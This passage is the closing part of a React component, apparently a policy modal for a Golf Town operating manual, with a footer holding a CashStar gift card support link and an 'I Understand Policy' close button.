        </div>

        {/* Modal Footer */}
        <div className="bg-slate-950 px-6 py-4 border-t border-slate-800 flex items-center justify-between flex-wrap gap-2">
          <div className="flex items-center gap-3 text-[11px] text-slate-500 font-mono">
            <span>Golf Town Operating Manual #GT-SC-2026</span>
            <span>•</span>
            <a
              href="https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca"
              target="_blank"
              rel="noopener noreferrer"
              className="text-emerald-400 hover:underline inline-flex items-center gap-1"
            >
              <span>CashStar Gift Card Support</span>
              <ExternalLink className="w-3 h-3" />
            </a>
          </div>
          <button
            onClick={onClose}
            className="px-5 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs rounded-xl shadow-lg transition-all cursor-pointer"
          >
            I Understand Policy
          </button>
        </div>

      </div>
    </div>
  );
}

